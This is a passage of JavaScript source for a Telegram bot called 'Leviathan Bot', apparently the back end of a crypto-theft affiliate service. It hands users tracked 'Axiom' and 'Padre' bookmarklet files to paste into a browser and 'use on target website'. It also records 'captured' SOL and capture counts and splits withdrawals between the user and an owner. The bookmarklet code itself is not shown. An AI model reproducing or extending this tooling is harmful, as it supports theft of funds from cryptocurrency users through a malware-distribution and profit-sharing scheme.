  if (normalized === '💼 wallet' || normalized === 'wallet') {
    if (!state.wallet) {
      return ctx.replyWithHTML(language.noWallet);
    }
    return ctx.replyWithHTML(language.walletDisplay.replace('{address}', state.wallet));
  }
  if (normalized === 'withdraw') {
    const result = await executeWithdrawal(userId, 'manual');
    if (result.error === 'noWallet') {
      return ctx.replyWithHTML(language.noWallet);
    }
    if (result.error === 'noFunds') {
      return ctx.replyWithHTML('❌ <b>No available balance to withdraw yet.</b>');
    }
    if (result.error) {
      return ctx.replyWithHTML(`❌ <b>Withdrawal failed:</b> ${result.error}`);
    }

    let reply = `✅ <b>Withdrawal processed</b>\n` +
      `• Total amount: <code>${formatCurrency(result.amount)} SOL</code>\n` +
      `• User share: <code>${formatCurrency(result.userAmount)} SOL</code>\n` +
      `• Owner share: <code>${formatCurrency(result.ownerAmount)} SOL</code>`;

    if (result.transferResults.user || result.transferResults.owner) {
      reply += `\n\n${result.note}`;
    }

    return ctx.replyWithHTML(reply);
  }
  if (normalized === '❓ help' || normalized === 'help') {
    return ctx.replyWithHTML('📩 <b>Need help?</b>\nContact the owner directly: @late');
  }
  if (normalized === 'owner wallet') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    return ctx.replyWithHTML(`🏦 <b>Owner payout wallet</b>\n<code>${botConfig.ownerWallet}</code>`);
  }
  if (normalized === 'admin mode') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.mode = 'admin';
    return ctx.replyWithHTML('🎖️ <b>Admin mode enabled.</b>\nUse /menu to access admin controls.');
  }
  if (normalized === 'user mode') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.mode = 'user';
    return ctx.replyWithHTML('✅ <b>User mode enabled.</b>\nUse /menu to continue.');
  }
  if (normalized === '📜 script' || normalized === 'script') {
    await ctx.sendChatAction('typing');
    await new Promise(resolve => setTimeout(resolve, 2000));
    await ctx.replyWithHTML('🔧 <b>Generating Axiom + Padre bookmarklets...</b>');
    await new Promise(resolve => setTimeout(resolve, 3000));

    const inlineKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📁 Axiom file', 'download_axiom_file'), Markup.button.callback('📁 Padre file', 'download_padre_file')],
      [bookmarkletSiteUrl ? Markup.button.url('🔗 Landing link', bookmarkletSiteUrl) : Markup.button.callback('🔗 Landing link', 'open_landing_link')],
    ]);

    return ctx.replyWithHTML(
      '✅ <b>Both bookmarklets ready: Axiom & Padre</b>\n\n📁 Download each bookmarklet as a separate file.\n🔗 One link — the landing page with both bookmarklets.\n<b>Ref code:</b> <code>/setref</code>',
      inlineKeyboard
    );
  }
  if (normalized === '📊 stats' || normalized === 'stats') {
    if (!state.wallet) {
      return ctx.replyWithHTML(language.noWallet);
    }
    const statsTemplate = language.statsMessage || languages.en.statsMessage;
    const stats = statsTemplate
      .replace('{wallet}', state.wallet)
      .replace('{captured}', formatCurrency(state.totalCaptured))
      .replace('{available}', formatCurrency(state.available))
      .replace('{withdrawn}', formatCurrency(state.withdrawn))
      .replace('{captures}', String(state.totalCaptures))
      .replace('{auto}', state.autoWithdraw ? 'ON' : 'OFF')
      .replace('{user}', String(botConfig.userShare))
      .replace('{owner}', String(botConfig.ownerShare));
    const tierLabel = state.tier2 ? 'Tier 2' : 'Tier 1';
    return ctx.replyWithHTML(`${stats}\n\n🏅 <b>Tier</b>: <code>${tierLabel}</code>`);
  }
  if (
    normalized === 'auto withdraw' ||
    normalized === 'auto withdraw ✅' ||
    normalized === 'auto withdraw ❌' ||
    normalized === 'auto withdrawal' ||
    normalized === 'auto withdrawal ✅' ||
    normalized === 'auto withdrawal ❌' ||
    normalized === 'enable auto withdraw' ||
    normalized === 'disable auto withdraw' ||
    normalized === 'enable auto withdrawal' ||
    normalized === 'disable auto withdrawal'
  ) {
    state.autoWithdraw = !state.autoWithdraw;
    const keyboard = getMenuKeyboard(userId);
    if (state.autoWithdraw) {
      const result = await processAutoWithdraw(userId);
      if (result && !result.error) {
        return ctx.replyWithHTML(
          `Auto withdrawal on\n\n✅ <b>Auto payout split processed</b>\n• User: <code>${formatCurrency(result.userAmount)} SOL</code>\n• Owner: <code>${formatCurrency(result.ownerAmount)} SOL</code>`,
          keyboard
        );
      }
      return ctx.replyWithHTML('Auto withdrawal on', keyboard);
    }
    return ctx.replyWithHTML('Auto withdrawal off', keyboard);
  }
  
  // If user is at wallet step
  if (state && state.step === 'wallet') {
    const address = text;
    
    if (!isValidSolanaAddress(address)) {
      return ctx.replyWithHTML(language.invalidWallet);
    }
    
    // Save wallet and mark as completed
    userState[userId].wallet = address;
    userState[userId].step = 'completed';
    
    const message = language.registrationComplete.replace('{address}', address);
    return ctx.replyWithHTML(message);
  }
  
  // Default fallback
  return sendLanguageSelection(ctx);
});

bot.action('download_axiom_file', async (ctx) => {
  try {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'bookmarklet';
    await ctx.answerCbQuery('Preparing Axiom file...');
    await ctx.replyWithHTML(
      '✅ <b>Axiom Bookmarklet ready!</b>\n\n' +
      '📥 <b>Download the file below</b>\n\n' +
      '📋 <b>Installation:</b>\n' +
      '1. Open the file\n' +
      '2. Copy all text (Ctrl+A → Ctrl+C)\n' +
      '3. Create a bookmark in browser\n' +
      '4. Paste code in URL field\n' +
      '5. Done! Use on target website'
    );
    const { buffer, filename } = buildBookmarkletFile('axiom', userId, username);
    return ctx.replyWithDocument({ source: buffer, filename });
  } catch (err) {
    await ctx.answerCbQuery();
    return ctx.replyWithHTML('❌ <b>Unable to prepare Axiom bookmarklet file.</b>');
  }
});

bot.action('download_padre_file', async (ctx) => {
  try {
    const userId = ctx.from.id;
    const username = ctx.from.username || ctx.from.first_name || 'bookmarklet';
    await ctx.answerCbQuery('Preparing Padre file...');
    await ctx.replyWithHTML(
      '✅ <b>Padre Bookmarklet ready!</b>\n\n' +
      '📥 <b>Download the file below</b>\n\n' +
      '📋 <b>Installation:</b>\n' +
      '1. Open the file\n' +
      '2. Copy all text (Ctrl+A → Ctrl+C)\n' +
      '3. Create a bookmark in browser\n' +
      '4. Paste code in URL field\n' +
      '5. Done! Use on target website'
    );
    const { buffer, filename } = buildBookmarkletFile('padre', userId, username);
    return ctx.replyWithDocument({ source: buffer, filename });
  } catch (err) {
    await ctx.answerCbQuery();
    return ctx.replyWithHTML('❌ <b>Unable to prepare Padre bookmarklet file.</b>');
  }
});

bot.action('open_landing_link', async (ctx) => {
  await ctx.answerCbQuery();
  if (bookmarkletSiteUrl) {
    return ctx.replyWithHTML(`🔗 <b>Landing page:</b>\n${bookmarkletSiteUrl}`);
  }
  return ctx.replyWithHTML('⚠️ <b>No landing page URL is configured yet.</b> Use /setbookmarkleturl to set your hosted bookmarklet site.');
});

startWebServer();

bot.launch().then(() => {
  console.log('Leviathan Bot launched successfully.');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
